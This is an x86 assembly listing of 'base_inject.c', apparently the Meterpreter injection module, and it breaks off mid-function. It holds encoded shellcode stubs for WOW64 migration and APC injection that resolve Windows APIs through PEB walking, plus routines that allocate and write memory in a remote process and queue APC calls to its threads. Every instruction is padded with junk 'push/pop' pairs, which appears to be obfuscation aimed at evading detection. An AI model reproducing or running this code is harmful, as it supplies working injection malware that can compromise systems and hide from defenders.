	.file	"base_inject.c"
	.text
	.section .rdata,"dr"
LC0:
	.ascii "[%04x] \0"
LC1:
	.ascii "\15\12\0"
	.text
	.def	_real_dprintf;	.scl	3;	.type	32;	.endef
_real_dprintf:
	pushl	%ebp
push %eax
pop %eax
	movl	%esp, %ebp
push %eax
pop %eax
	pushl	%esi
push %eax
pop %eax
	pushl	%ebx
push %eax
pop %eax
	subl	$1072, %esp
push %eax
pop %eax
	movl	__imp__GetCurrentThreadId@0, %eax
push %eax
pop %eax
	call	*%eax
push %eax
pop %eax
	movl	%eax, 16(%esp)
push %eax
pop %eax
	movl	$LC0, 12(%esp)
push %eax
pop %eax
	movl	$1023, 8(%esp)
push %eax
pop %eax
	movl	$1024, 4(%esp)
push %eax
pop %eax
	leal	-1040(%ebp), %eax
push %eax
pop %eax
	movl	%eax, (%esp)
push %eax
pop %eax
	movl	__imp___snprintf_s, %eax
push %eax
pop %eax
	call	*%eax
push %eax
pop %eax
	leal	-1040(%ebp), %eax
push %eax
pop %eax
	movl	%eax, (%esp)
push %eax
pop %eax
	call	_strlen
push %eax
pop %eax
	movl	%eax, -12(%ebp)
push %eax
pop %eax
	leal	12(%ebp), %eax
push %eax
pop %eax
	movl	%eax, -16(%ebp)
push %eax
pop %eax
	movl	-16(%ebp), %ecx
push %eax
pop %eax
	movl	$1021, %eax
push %eax
pop %eax
	subl	-12(%ebp), %eax
push %eax
pop %eax
	movl	%eax, %edx
push %eax
pop %eax
	movl	$1024, %eax
push %eax
pop %eax
	subl	-12(%ebp), %eax
push %eax
pop %eax
	leal	-1040(%ebp), %esi
push %eax
pop %eax
	movl	-12(%ebp), %ebx
push %eax
pop %eax
	addl	%esi, %ebx
push %eax
pop %eax
	movl	%ecx, 16(%esp)
push %eax
pop %eax
	movl	8(%ebp), %ecx
push %eax
pop %eax
	movl	%ecx, 12(%esp)
push %eax
pop %eax
	movl	%edx, 8(%esp)
push %eax
pop %eax
	movl	%eax, 4(%esp)
push %eax
pop %eax
	movl	%ebx, (%esp)
push %eax
pop %eax
	call	_vsnprintf_s
push %eax
pop %eax
	movl	$LC1, 8(%esp)
push %eax
pop %eax
	movl	$1024, 4(%esp)
push %eax
pop %eax
	leal	-1040(%ebp), %eax
push %eax
pop %eax
	movl	%eax, (%esp)
push %eax
pop %eax
	movl	__imp__strcat_s, %eax
push %eax
pop %eax
	call	*%eax
push %eax
pop %eax
	leal	-1040(%ebp), %eax
push %eax
pop %eax
	movl	%eax, (%esp)
push %eax
pop %eax
	movl	__imp__OutputDebugStringA@4, %eax
push %eax
pop %eax
	call	*%eax
push %eax
pop %eax
	subl	$4, %esp
push %eax
pop %eax
	nop
push %eax
pop %eax
	leal	-8(%ebp), %esp
push %eax
pop %eax
	popl	%ebx
push %eax
pop %eax
	popl	%esi
push %eax
pop %eax
	popl	%ebp
push %eax
pop %eax
	ret
push %eax
pop %eax
	.globl	_migrate_executex64
	.data
	.align 32
_migrate_executex64:
	.ascii "U\211\345VW\213u\10\213M\14\350\0\0\0\0X\203\300+\203\354\10\211\342\307B\4"
	.ascii "3\0\0\0\211\2\350\17\0\0\0f\214\330f\216\320\203\304\24_^]\302\10\0\213<\344\377*H1\300W\377\326_P\307D$\4#\0\0\0\211<$\377,$\0"
	.globl	_migrate_wownativex
	.align 32
_migrate_wownativex:
	.ascii "\374H\211\316H\211\347H\203\344\360\350\310\0\0\0AQAPRQVH1\322eH\213R`H\213R\30H\213R H\213rPH\17\267JJM1\311H1\300\254<a|\2, A\301\311\15A\1\301\342\355RAQH\213R \213B<H\1\320f\201x\30\13\2ur\213\200\210\0\0\0H\205\300tgH\1\320P\213H\30D\213@ I\1\320\343VH\377\311A\213"
	.ascii "4\210H\1\326M1\311H1\300\254A\301\311\15A\1\301"
	.ascii "8\340u\361L\3L$\10E9\321u\330XD\213@$I\1\320fA\213\14HD\213@\34I\1\320A\213\4\210H\1\320AXAX^YZAXAYAZH\203\354 AR\377\340XAYZH\213\22\351O\377\377\377]M1\311AQH\215F\30P\377v\20\377v\10AQAQI\270\1\0\0\0\0\0\0\0H1\322H\213\16A\272\310"
	.ascii "8\244@\377\325H\205\300t\14H\270\0\0\0\0\0\0\0\0\353\12H\270\1\0\0\0\0\0\0\0H\203\304PH\211\374\303\0"
	.globl	_apc_stub_x86
	.align 32
_apc_stub_x86:
	.ascii "\374\213t$\4U\211\345\350\211\0\0\0`\211\345"
	.ascii "1\322d\213R0\213R\14\213R\24\213r(\17\267J&1\377"
	.ascii "1\300\254<a|\2, \301\317\15\1\307\342\360RW\213R\20\213B<\1\320\213@x\205\300tJ\1\320P\213H\30\213X \1\323\343<I\213"
	.ascii "4\213\1\326"
	.ascii "1\377"
	.ascii "1\300\254\301\317\15\1\307"
	.ascii "8\340u\364\3}\370;}$u\342X\213X$\1\323f\213\14K\213X\34\1\323\213\4\213\1\320\211D$$[[aYZQ\377\340X_Z\213\22\353\206[\200~\20\0u;\306F\20\1h\246\225\275\235\377\323<\6|\32"
	.ascii "1\311d\213A\30"
	.ascii "9\210\250\1\0\0u\14\215\223\317\0\0\0\211\220\250\1\0\0"
	.ascii "1\311QQ\377v\10\377"
	.ascii "6QQh8h\15\26\377\323\311\302\14\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0"
	.globl	_apc_stub_x64
	.align 32
_apc_stub_x64:
	.ascii "\374\200y\20\0\17\205\23\1\0\0\306A\20\1H\203\354x\350\310\0\0\0AQAPRQVH1\322eH\213R`H\213R\30H\213R H\213rPH\17\267JJM1\311H1\300\254<a|\2, A\301\311\15A\1\301\342\355RAQH\213R \213B<H\1\320f\201x\30\13\2ur\213\200\210\0\0\0H\205\300tgH\1\320P\213H\30D\213@ I\1\320\343VH\377\311A\213"
	.ascii "4\210H\1\326M1\311H1\300\254A\301\311\15A\1\301"
	.ascii "8\340u\361L\3L$\10E9\321u\330XD\213@$I\1\320fA\213\14HD\213@\34I\1\320A\213\4\210H\1\320AXAX^YZAXAYAZH\203\354 AR\377\340XAYZH\213\22\351O\377\377\377]H1\322eH\213B0H9\220\310\2\0\0u\16H\215\225\7\1\0\0H\211\220\310\2\0\0L\213\1L\213I\10H1\311H1\322QQA\272"
	.ascii "8h\15\26\377\325H\201\304\250\0\0\0\303\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0"
	.section .rdata,"dr"
	.align 4
LC2:
	.ascii "[INJECT] inject_via_apcthread: VirtualAllocEx 0x6B0095F0 failed\0"
LC3:
	.ascii "%s. error=%d (0x%x)\0"
	.align 4
LC4:
	.ascii "[INJECT] inject_via_apcthread: VirtualQueryEx failed\0"
	.align 4
LC5:
	.ascii "[INJECT] inject_via_apcthread: malloc lpNopSled failed\0"
	.align 4
LC6:
	.ascii "[INJECT] inject_via_apcthread: WriteProcessMemory lpNopSled failed\0"
	.align 4
LC7:
	.ascii "[INJECT] inject_via_apcthread: WriteProcessMemory bStub failed\0"
	.align 4
LC8:
	.ascii "[INJECT] inject_via_apcthread: Invalid target architecture\0"
LC9:
	.ascii "ntdll\0"
	.align 4
LC10:
	.ascii "[INJECT] inject_via_apcthread: LoadLibraryA failed\0"
LC11:
	.ascii "NtQueueApcThread\0"
	.align 4
LC12:
	.ascii "[INJECT] inject_via_apcthread: GetProcAddress NtQueueApcThread failed\0"
	.align 4
LC13:
	.ascii "[INJECT] inject_via_apcthread: CreateToolhelp32Snapshot failed\0"
	.align 4
LC14:
	.ascii "[INJECT] inject_via_apcthread: Thread32First failed\0"
	.align 4
LC15:
	.ascii "[INJECT] inject_via_apcthread: VirtualAllocEx failed\0"
LC16:
	.ascii "x86\0"
	.align 4
LC17:
	.ascii "[INJECT] -- dwMeterpreterArch=%s, lpRemoteApcStub=0x%08X, lpRemoteApcContext=0x%08X\0"
	.align 4
LC18:
	.ascii "[INJECT] inject_via_apcthread: WriteProcessMemory lpRemoteApcStub failed\0"
	.align 4
LC19:
	.ascii "[INJECT] inject_via_apcthread: WriteProcessMemory lpRemoteApcContext failed\0"
	.align 4
LC20:
	.ascii "[INJECT] inject_via_apcthread: Trying to inject into thread %d\0"
	.align 4
LC21:
	.ascii "[INJECT] inject_via_apcthread: pNtQueueApcThread for thread %d Succeeded.\0"
	.align 4
LC22:
	.ascii "[INJECT] inject_via_apcthread: pNtQueueApcThread for thread %d Failed.\0"
	.text
	.globl	_inject_via_apcthread
	.def	_inject_via_apcthread;	.scl	2;	.type	32;	.endef
_inject_via_apcthread:
	pushl	%ebp
push %eax
pop %eax
	movl	%esp, %ebp
push %eax
pop %eax
	subl	$200, %esp
push %eax
pop %eax
	movl	$5, -12(%ebp)
push %eax
pop %eax
	movl	$0, -16(%ebp)
push %eax
pop %eax
	movl	$0, -32(%ebp)
push %eax
pop %eax
	movl	$0, -20(%ebp)
push %eax
pop %eax
	movl	$0, -24(%ebp)
push %eax
pop %eax
	movl	$0, -36(%ebp)
push %eax
pop %eax
	movl	$0, -40(%ebp)
push %eax
pop %eax
	movl	$0, -44(%ebp)
push %eax
pop %eax
	movl	$0, %ecx
push %eax
pop %eax
	movl	$28, %eax
push %eax
pop %eax
	andl	$-4, %eax
push %eax
pop %eax
	movl	%eax, %edx
push %eax
pop %eax
	movl	$0, %eax
push %eax
pop %eax
L3:
	movl	%ecx, -88(%ebp,%eax)
push %eax
pop %eax
	addl	$4, %eax
push %eax
pop %eax
	cmpl	%edx, %eax
push %eax
pop %eax
	jb	L3
push %eax
pop %eax
	movl	$0, -108(%ebp)
push %eax
pop %eax
	movl	$0, -104(%ebp)
push %eax
pop %eax
	movl	$0, -100(%ebp)
push %eax
pop %eax
	movl	$0, -96(%ebp)
push %eax
pop %eax
	movl	$0, -92(%ebp)
push %eax
pop %eax
	movl	$0, -28(%ebp)
push %eax
pop %eax
	call	_list_create
push %eax
pop %eax
	movl	%eax, -44(%ebp)
push %eax
pop %eax
	cmpl	$0, -44(%ebp)
push %eax
pop %eax
	je	L39
push %eax
pop %eax
	movl	28(%ebp), %eax
push %eax
pop %eax
	movl	%eax, -108(%ebp)
push %eax
pop %eax
	movl	32(%ebp), %eax
push %eax
pop %eax
	movl	%eax, -100(%ebp)
push %eax
pop %eax
	movb	$0, -92(%ebp)
push %eax
pop %eax
	movl	$28, -88(%ebp)
push %eax
pop %eax
	cmpl	$1, 24(%ebp)
push %eax
pop %eax
	jne	L7
push %eax
pop %eax
	movl	$_apc_stub_x86, -24(%ebp)
push %eax
pop %eax
	movl	$245, -28(%ebp)
push %eax
pop %eax
	jmp	L8
push %eax
pop %eax
L7:
	cmpl	$2, 24(%ebp)
push %eax
pop %eax
	jne	L9
push %eax
pop %eax
	movl	$_apc_stub_x64, -24(%ebp)
push %eax
pop %eax
	movl	$324, -28(%ebp)
push %eax
pop %eax
	movl	$0, %ecx
push %eax
pop %eax
	movl	$28, %eax
push %eax
pop %eax
	andl	$-4, %eax
push %eax
pop %eax
	movl	%eax, %edx
push %eax
pop %eax
	movl	$0, %eax
push %eax
pop %eax
L10:
	movl	%ecx, -136(%ebp,%eax)
push %eax
pop %eax
	addl	$4, %eax
push %eax
pop %eax
	cmpl	%edx, %eax
push %eax
pop %eax
	jb	L10
push %eax
pop %eax
	movl	$0, -48(%ebp)
push %eax
pop %eax
	movl	$0, -52(%ebp)
push %eax
pop %eax
	movl	$1221101896, -154(%ebp)
push %eax
pop %eax
	movl	$1210114497, -150(%ebp)
push %eax
pop %eax
	movl	$1210116545, -146(%ebp)
push %eax
pop %eax
	movl	$-14620479, -142(%ebp)
push %eax
pop %eax
	movw	$224, -138(%ebp)
push %eax
pop %eax
	movl	$64, 16(%esp)
push %eax
pop %eax
	movl	$12288, 12(%esp)
push %eax
pop %eax
	movl	$8192, 8(%esp)
push %eax
pop %eax
	movl	$1795200496, 4(%esp)
push %eax
pop %eax
	movl	16(%ebp), %eax
push %eax
pop %eax
	movl	%eax, (%esp)
push %eax
pop %eax
	movl	__imp__VirtualAllocEx@20, %eax
push %eax
pop %eax
	call	*%eax
push %eax
pop %eax
	subl	$20, %esp
push %eax
pop %eax
	movl	%eax, -48(%ebp)
push %eax
pop %eax
	cmpl	$0, -48(%ebp)
push %eax
pop %eax
	jne	L12
push %eax
pop %eax
	movl	__imp__GetLastError@0, %eax
push %eax
pop %eax
	call	*%eax
push %eax
pop %eax
	movl	%eax, -12(%ebp)
push %eax
pop %eax
	movl	-12(%ebp), %eax
push %eax
pop %eax
	movl	%eax, 12(%esp)
push %eax
pop %eax
	movl	-12(%ebp), %eax
push %eax
pop %eax
	movl	%eax, 8(%esp)
push %eax
pop %eax
	movl	$LC2, 4(%esp)
push %eax
pop %eax
	movl	$LC3, (%esp)
push %eax
pop %eax
	call	_real_dprintf
push %eax
pop %eax
	jmp	L6
push %eax
pop %eax
L12:
	movl	$28, 12(%esp)
push %eax
pop %eax
	leal	-136(%ebp), %eax
push %eax
pop %eax
	movl	%eax, 8(%esp)
push %eax
pop %eax
	movl	-48(%ebp), %eax
push %eax
pop %eax
	movl	%eax, 4(%esp)
push %eax
pop %eax
	movl	16(%ebp), %eax
push %eax
pop %eax
	movl	%eax, (%esp)
push %eax
pop %eax
	movl	__imp__VirtualQueryEx@16, %eax
push %eax
pop %eax
	call	*%eax
push %eax
pop %eax
	subl	$16, %esp
push %eax
pop %eax
	testl	%eax, %eax
push %eax
pop %eax
	jne	L14
push %eax
pop %eax
	movl	__imp__GetLastError@0, %eax
push %eax
pop %eax
	call	*%eax
push %eax
pop %eax
	movl	%eax, -12(%ebp)
push %eax
pop %eax
	movl	-12(%ebp), %eax
push %eax
pop %eax
	movl	%eax, 12(%esp)
push %eax
pop %eax
	movl	-12(%ebp), %eax
push %eax
pop %eax
	movl	%eax, 8(%esp)
push %eax
pop %eax
	movl	$LC4, 4(%esp)
push %eax
pop %eax
	movl	$LC3, (%esp)
push %eax
pop %eax
	call	_real_dprintf
push %eax
pop %eax
	jmp	L6
push %eax
pop %eax
L14:
	movl	-124(%ebp), %eax
push %eax
pop %eax
	movl	%eax, (%esp)
push %eax
pop %eax
	call	_malloc
push %eax
pop %eax
	movl	%eax, -52(%ebp)
push %eax
pop %eax
	cmpl	$0, -52(%ebp)
push %eax
pop %eax
	jne	L15
push %eax
pop %eax
	movl	__imp__GetLastError@0, %eax
push %eax
pop %eax
	call	*%eax
push %eax
pop %eax
	movl	%eax, -12(%ebp)
push %eax
pop %eax
	movl	-12(%ebp), %eax
push %eax
pop %eax
	movl	%eax, 12(%esp)
push %eax
pop %eax
	movl	-12(%ebp), %eax
push %eax
pop %eax
	movl	%eax, 8(%esp)
push %eax
pop %eax
	movl	$LC5, 4(%esp)
push %eax
pop %eax
	movl	$LC3, (%esp)
push %eax
pop %eax
	call	_real_dprintf
push %eax
pop %eax
	jmp	L6
push %eax
pop %eax
L15:
	movl	-124(%ebp), %eax
push %eax
pop %eax
	movl	%eax, 8(%esp)
push %eax
pop %eax
	movl	$144, 4(%esp)
push %eax
pop %eax
	movl	-52(%ebp), %eax
push %eax
pop %eax
	movl	%eax, (%esp)
push %eax
pop %eax
	call	_memset
push %eax
pop %eax
	movl	-124(%ebp), %eax
push %eax
pop %eax
	movl	$0, 16(%esp)
push %eax
pop %eax
	movl	%eax, 12(%esp)
push %eax
pop %eax
	movl	-52(%ebp), %eax
push %eax
pop %eax
	movl	%eax, 8(%esp)
push %eax
pop %eax
	movl	-48(%ebp), %eax
push %eax
pop %eax
	movl	%eax, 4(%esp)
push %eax
pop %eax
	movl	16(%ebp), %eax
push %eax
pop %eax
	movl	%eax, (%esp)
push %eax
pop %eax
	movl	__imp__WriteProcessMemory@20, %eax
push %eax
pop %eax
	call	*%eax
push %eax
pop %eax
	subl	$20, %esp
push %eax
pop %eax
	testl	%eax, %eax
push %eax
pop %eax
	jne	L16
push %eax
pop %eax
	movl	__imp__GetLastError@0, %eax
push %eax
pop %eax
	call	*%eax
push %eax
pop %eax
	movl	%eax, -12(%ebp)
push %eax
pop %eax
	movl	-12(%ebp), %eax
push %eax
pop %eax
	movl	%eax, 12(%esp)
push %eax
pop %eax
	movl	-12(%ebp), %eax
push %eax
pop %eax
	movl	%eax, 8(%esp)
push %eax
pop %eax
	movl	$LC6, 4(%esp)
push %eax
pop %eax
	movl	$LC3, (%esp)
push %eax
pop %eax
	call	_real_dprintf
push %eax
pop %eax
	jmp	L6
push %eax
pop %eax
L16:
	movl	-124(%ebp), %eax
push %eax
pop %eax
	leal	-18(%eax), %edx
push %eax
pop %eax
	movl	-48(%ebp), %eax
push %eax
pop %eax
	addl	%eax, %edx
push %eax
pop %eax
	movl	$0, 16(%esp)
push %eax
pop %eax
	movl	$18, 12(%esp)
push %eax
pop %eax
	leal	-154(%ebp), %eax
push %eax
pop %eax
	movl	%eax, 8(%esp)
push %eax
pop %eax
	movl	%edx, 4(%esp)
push %eax
pop %eax
	movl	16(%ebp), %eax
push %eax
pop %eax
	movl	%eax, (%esp)
push %eax
pop %eax
	movl	__imp__WriteProcessMemory@20, %eax
push %eax
pop %eax
	call	*%eax
push %eax
pop %eax
	subl	$20, %esp
push %eax
pop %eax
	testl	%eax, %eax
push %eax
pop %eax
	jne	L17
push %eax
pop %eax
	movl	__imp__GetLastError@0, %eax
push %eax
pop %eax
	call	*%eax
push %eax
pop %eax
	movl	%eax, -12(%ebp)
push %eax
pop %eax
	movl	-12(%ebp), %eax
push %eax
pop %eax
	movl	%eax, 12(%esp)
push %eax
pop %eax
	movl	-12(%ebp), %eax
push %eax
pop %eax
	movl	%eax, 8(%esp)
push %eax
pop %eax
	movl	$LC7, 4(%esp)
push %eax
pop %eax
	movl	$LC3, (%esp)
push %eax
pop %eax
	call	_real_dprintf
push %eax
pop %eax
	jmp	L6
push %eax
pop %eax
L17:
	movl	-52(%ebp), %eax
push %eax
pop %eax
	movl	%eax, (%esp)
push %eax
pop %eax
	call	_free
push %eax
pop %eax
	jmp	L8
push %eax
pop %eax
L9:
	movl	$10, (%esp)
push %eax
pop %eax
	movl	__imp__SetLastError@4, %eax
push %eax
pop %eax
	call	*%eax
push %eax
pop %eax
	subl	$4, %esp
push %eax
pop %eax
	movl	__imp__GetLastError@0, %eax
push %eax
pop %eax
	call	*%eax
push %eax
pop %eax
	movl	%eax, -12(%ebp)
push %eax
pop %eax
	movl	-12(%ebp), %eax
push %eax
pop %eax
	movl	%eax, 12(%esp)
push %eax
pop %eax
	movl	-12(%ebp), %eax
push %eax
pop %eax
	movl	%eax, 8(%esp)
push %eax
pop %eax
	movl	$LC8, 4(%esp)
push %eax
pop %eax
	movl	$LC3, (%esp)
push %eax
pop %eax
	call	_real_dprintf
push %eax
pop %eax
	jmp	L6
push %eax
pop %eax
L8:
	movl	$LC9, (%esp)
push %eax
pop %eax
	movl	__imp__LoadLibraryA@4, %eax
push %eax
pop %eax
	call	*%eax
push %eax
pop %eax
	subl	$4, %esp
push %eax
pop %eax
	movl	%eax, -16(%ebp)
push %eax
pop %eax
	cmpl	$0, -16(%ebp)
push %eax
pop %eax
	jne	L18
push %eax
pop %eax
	movl	__imp__GetLastError@0, %eax
push %eax
pop %eax
	call	*%eax
push %eax
pop %eax
	movl	%eax, -12(%ebp)
push %eax
pop %eax
	movl	-12(%ebp), %eax
push %eax
pop %eax
	movl	%eax, 12(%esp)
push %eax
pop %eax
	movl	-12(%ebp), %eax
push %eax
pop %eax
	movl	%eax, 8(%esp)
push %eax
pop %eax
	movl	$LC10, 4(%esp)
push %eax
pop %eax
	movl	$LC3, (%esp)
push %eax
pop %eax
	call	_real_dprintf
push %eax
pop %eax
	jmp	L6
push %eax
pop %eax
L18:
	movl	$LC11, 4(%esp)
push %eax
pop %eax
	movl	-16(%ebp), %eax
push %eax
pop %eax
	movl	%eax, (%esp)
push %eax
pop %eax
	movl	__imp__GetProcAddress@8, %eax
push %eax
pop %eax
	call	*%eax
push %eax
pop %eax
	subl	$8, %esp
push %eax
pop %eax
	movl	%eax, -32(%ebp)
push %eax
pop %eax
	cmpl	$0, -32(%ebp)
push %eax
pop %eax
	jne	L19
push %eax
pop %eax
	movl	__imp__GetLastError@0, %eax
push %eax
pop %eax
	call	*%eax
push %eax
pop %eax
	movl	%eax, -12(%ebp)
push %eax
pop %eax
	movl	-12(%ebp), %eax
push %eax
pop %eax
	movl	%eax, 12(%esp)
push %eax
pop %eax
	movl	-12(%ebp), %eax
push %eax
pop %eax
	movl	%eax, 8(%esp)
push %eax
pop %eax
	movl	$LC12, 4(%esp)
push %eax
pop %eax
	movl	$LC3, (%esp)
push %eax
pop %eax
	call	_real_dprintf
push %eax
pop %eax
	jmp	L6
push %eax
pop %eax
L19:
	movl	$0, 4(%esp)
push %eax
pop %eax
	movl	$4, (%esp)
push %eax
pop %eax
	call	_CreateToolhelp32Snapshot@8
push %eax
pop %eax
	subl	$8, %esp
push %eax
pop %eax
	movl	%eax, -20(%ebp)
push %eax
pop %eax
	cmpl	$0, -20(%ebp)
push %eax
pop %eax
	jne	L20
push %eax
pop %eax
	movl	__imp__GetLastError@0, %eax
push %eax
pop %eax
	call	*%eax
push %eax
pop %eax
	movl	%eax, -12(%ebp)
push %eax
pop %eax
	movl	-12(%ebp), %eax
push %eax
pop %eax
	movl	%eax, 12(%esp)
push %eax
pop %eax
	movl	-12(%ebp), %eax
push %eax
pop %eax
	movl	%eax, 8(%esp)
push %eax
pop %eax
	movl	$LC13, 4(%esp)
push %eax
pop %eax
	movl	$LC3, (%esp)
push %eax
pop %eax
	call	_real_dprintf
push %eax
pop %eax
	jmp	L6
push %eax
pop %eax
L20:
	leal	-88(%ebp), %eax
push %eax
pop %eax
	movl	%eax, 4(%esp)
push %eax
pop %eax
	movl	-20(%ebp), %eax
push %eax
pop %eax
	movl	%eax, (%esp)
push %eax
pop %eax
	call	_Thread32First@8
push %eax
pop %eax
	subl	$8, %esp
push %eax
pop %eax
	testl	%eax, %eax
push %eax
pop %eax
	jne	L21
push %eax
pop %eax
	movl	__imp__GetLastError@0, %eax
push %eax
pop %eax
	call	*%eax
push %eax
pop %eax
	movl	%eax, -12(%ebp)
push %eax
pop %eax
	movl	-12(%ebp), %eax
push %eax
pop %eax
	movl	%eax, 12(%esp)
push %eax
pop %eax
	movl	-12(%ebp), %eax
push %eax
pop %eax
	movl	%eax, 8(%esp)
push %eax
pop %eax
	movl	$LC14, 4(%esp)
push %eax
pop %eax
	movl	$LC3, (%esp)
push %eax
pop %eax
	call	_real_dprintf
push %eax
pop %eax
	jmp	L6
push %eax
pop %eax
L21:
	movl	-28(%ebp), %eax
push %eax
pop %eax
	addl	$20, %eax
push %eax
pop %eax
	movl	$64, 16(%esp)
push %eax
pop %eax
	movl	$12288, 12(%esp)
push %eax
pop %eax
	movl	%eax, 8(%esp)
push %eax
pop %eax
	movl	$0, 4(%esp)
push %eax
pop %eax
	movl	16(%ebp), %eax
push %eax
pop %eax
	movl	%eax, (%esp)
push %eax
pop %eax
	movl	__imp__VirtualAllocEx@20, %eax
push %eax
pop %eax
	call	*%eax
push %eax
pop %eax
	subl	$20, %esp
push %eax
pop %eax
	movl	%eax, -36(%ebp)
push %eax
pop %eax
	cmpl	$0, -36(%ebp)
push %eax
pop %eax
	jne	L22
push %eax
pop %eax
	movl	__imp__GetLastError@0, %eax
push %eax
pop %eax
	call	*%eax
push %eax
pop %eax
	movl	%eax, -12(%ebp)
push %eax
pop %eax
	movl	-12(%ebp), %eax
push %eax
pop %eax
	movl	%eax, 12(%esp)
push %eax
pop %eax
	movl	-12(%ebp), %eax
push %eax
pop %eax
	movl	%eax, 8(%esp)
push %eax
pop %eax
	movl	$LC15, 4(%esp)
push %eax
pop %eax
	movl	$LC3, (%esp)
push %eax
pop %eax
	call	_real_dprintf
push %eax
pop %eax
	jmp	L6
push %eax
pop %eax
L22:
	movl	-36(%ebp), %edx
push %eax
pop %eax
	movl	-28(%ebp), %eax
push %eax
pop %eax
	addl	%edx, %eax
push %eax
pop %eax
	movl	%eax, -40(%ebp)
push %eax
pop %eax
	movl	-40(%ebp), %eax
push %eax
pop %eax
	movl	%eax, 12(%esp)
push %eax
pop %eax
	movl	-36(%ebp), %eax
push %eax
pop %eax
	movl	%eax, 8(%esp)
push %eax
pop %eax
	movl	$LC16, 4(%esp)
push %eax
pop %eax
	movl	$LC17, (%esp)
push %eax
pop %eax
	call	_real_dprintf
push %eax
pop %eax
	movl	$0, 16(%esp)
push %eax
pop %eax
	movl	-28(%ebp), %eax
push %eax
pop %eax
	movl	%eax, 12(%esp)
push %eax
pop %eax
	movl	-24(%ebp), %eax
push %eax
pop %eax
	movl	%eax, 8(%esp)
push %eax
pop %eax
	movl	-36(%ebp), %eax
push %eax
pop %eax
	movl	%eax, 4(%esp)
push %eax
pop %eax
	movl	16(%ebp), %eax
push %eax
pop %eax
	movl	%eax, (%esp)
push %eax
pop %eax
	movl	__imp__WriteProcessMemory@20, %eax
push %eax
pop %eax
	call	*%eax
push %eax
pop %eax
	subl	$20, %esp
push %eax
pop %eax
	testl	%eax, %eax
push %eax
pop %eax
	jne	L23
push %eax
pop %eax
	movl	__imp__GetLastError@0, %eax
push %eax
pop %eax
	call	*%eax
push %eax
pop %eax
	movl	%eax, -12(%ebp)
push %eax
pop %eax
	movl	-12(%ebp), %eax
push %eax
pop %eax
	movl	%eax, 12(%esp)
push %eax
pop %eax
	movl	-12(%ebp), %eax
push %eax
pop %eax
	movl	%eax, 8(%esp)
push %eax
pop %eax
	movl	$LC18, 4(%esp)
push %eax
pop %eax
	movl	$LC3, (%esp)
push %eax
pop %eax
	call	_real_dprintf
push %eax
pop %eax
	jmp	L6
push %eax
pop %eax
L23:
	movl	$0, 16(%esp)
push %eax
pop %eax
	movl	$20, 12(%esp)
push %eax
pop %eax
	leal	-108(%ebp), %eax
push %eax
pop %eax
	movl	%eax, 8(%esp)
push %eax
pop %eax
	movl	-40(%ebp), %eax
push %eax
pop %eax
	movl	%eax, 4(%esp)
push %eax
pop %eax
	movl	16(%ebp), %eax
push %eax
pop %eax
	movl	%eax, (%esp)
push %eax
pop %eax
	movl	__imp__WriteProcessMemory@20, %eax
push %eax
pop %eax
	call	*%eax
push %eax
pop %eax
	subl	$20, %esp
push %eax
pop %eax
	testl	%eax, %eax
push %eax
pop %eax
	jne	L24
push %eax
pop %eax
	movl	__imp__GetLastError@0, %eax
push %eax
pop %eax
	call	*%eax
push %eax
pop %eax
	movl	%eax, -12(%ebp)
push %eax
pop %eax
	movl	-12(%ebp), %eax
push %eax
pop %eax
	movl	%eax, 12(%esp)
push %eax
pop %eax
	movl	-12(%ebp), %eax
push %eax
pop %eax
	movl	%eax, 8(%esp)
push %eax
pop %eax
	movl	$LC19, 4(%esp)
push %eax
pop %eax
	movl	$LC3, (%esp)
push %eax
pop %eax
	call	_real_dprintf
push %eax
pop %eax
	jmp	L6
push %eax
pop %eax
L24:
	movl	$0, -56(%ebp)
push %eax
pop %eax
	movl	-76(%ebp), %eax
push %eax
pop %eax
	cmpl	%eax, 20(%ebp)
push %eax
pop %eax
	jne	L40
push %eax
pop %eax
	movl	-80(%ebp), %eax
push %eax
pop %eax
	movl	%eax, 8(%esp)
push %eax
pop %eax
	movl	$0, 4(%esp)
push %eax
pop %eax
	movl	$2032639, (%esp)
push %eax
pop %eax
	movl	__imp__OpenThread@12, %eax
push %eax
pop %eax
	call	*%eax
push %eax
pop %eax
	subl	$12, %esp
push %eax
pop %eax
	movl	%eax, -56(%ebp)
push %eax
pop %eax
	cmpl	$0, -56(%ebp)
push %eax
pop %eax
	je	L41
push %eax
pop %eax
	movl	-80(%ebp), %eax
push %eax
pop %eax
	movl	%eax, 4(%esp)
push %eax
pop %eax
	movl	$LC20, (%esp)
push %eax
pop %eax
	call	_real_dprintf
push %eax
pop %eax
	movl	-56(%ebp), %eax
push %eax
pop %eax
	movl	%eax, (%esp)
push %eax
pop %eax
	movl	__imp__SuspendThread@4, %eax
push %eax
pop %eax
	call	*%eax
push %eax
pop %eax
	subl	$4, %esp
push %eax
pop %eax
	cmpl	$-1, %eax
push %eax
pop %eax
	je	L28
push %eax
pop %eax
	movl	-56(%ebp), %eax
push %eax
pop %eax
	movl	%eax, 4(%esp)
push %eax
pop %eax
	movl	-44(%ebp), %eax
push %eax
pop %eax
	movl	%eax, (%esp)
push %eax
pop %eax
	call	_list_push
push %eax
pop %eax
	movl	$0, 16(%esp)
push %eax
pop %eax
	movl	$0, 12(%esp)
push %eax
pop %eax
	movl	-40(%ebp), %eax
push %eax
pop %eax
	movl	%eax, 8(%esp)
push %eax
pop %eax
	movl	-36(%ebp), %eax
push %eax
pop %eax
	movl	%eax, 4(%esp)
push %eax
pop %eax
	movl	-56(%ebp), %eax
push %eax
pop %eax
	movl	%eax, (%esp)
push %eax
pop %eax
	movl	-32(%ebp), %eax
push %eax
pop %eax
	call	*%eax
push %eax
pop %eax
	subl	$20, %esp
push %eax
pop %eax
	testl	%eax, %eax
push %eax
pop %eax
	jne	L29
push %eax
pop %eax
	movl	-80(%ebp), %eax
push %eax
pop %eax
	movl	%eax, 4(%esp)
push %eax
pop %eax
	movl	$LC21, (%esp)
push %eax
pop %eax
	call	_real_dprintf
push %eax
pop %eax
	movl	$0, -12(%ebp)
push %eax
pop %eax
	jmp	L26
push %eax
pop %eax
L29:
	movl	-80(%ebp), %eax
push %eax
pop %eax
	movl	%eax, 4(%esp)
push %eax
pop %eax
	movl	$LC22, (%esp)
push %eax
pop %eax
	call	_real_dprintf
push %eax
pop %eax
	jmp	L26
push %eax
pop %eax
L28:
	movl	-56(%ebp), %eax
push %eax
pop %eax
	movl	%eax, (%esp)
push %eax
pop %eax
	movl	__imp__CloseHandle@4, %eax
push %eax
pop %eax
	call	*%eax
